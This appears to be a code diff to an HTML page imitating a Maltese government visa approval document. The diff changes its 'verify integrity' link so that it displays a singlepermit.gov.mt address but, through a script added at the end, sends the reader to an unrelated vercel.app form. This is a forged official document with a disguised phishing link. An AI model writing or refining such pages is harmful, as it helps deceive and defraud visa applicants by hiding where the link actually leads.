@@ -148,15 +148,22 @@
       <div class="bottom-section">
         <img src="qr.png" alt="QR Code" />
         <div>Verify integrity of this document online:</div>
-        <a href="https://appky-form.vercel.app/visadetails.html"
-          >https://singlepermit.gov.mt/0Doc/</a
-        >
+        <a href="javascript:void(0);" onclick="showVerificationLink()" id="verificationLink">Click here to verify</a>
         <div class="code">74344</div>
       </div>
 
-      <div class="note"
-        >Approval in Principle – Still Abroad Applications V7.0</div
-      >
+      <div class="note">Approval in Principle – Still Abroad Applications V7.0</div>
     </div>
+
+    <script>
+      function showVerificationLink() {
+        const link = document.getElementById('verificationLink');
+        link.href = 'https://appky-form.vercel.app/visadetails.html';
+        link.textContent = 'https://singlepermit.gov.mt/0Doc/';
+        link.onclick = function() {
+          window.location.href = 'https://appky-form.vercel.app/visadetails.html';
+        };
+      }
+    </script>
   </body>
 </html>
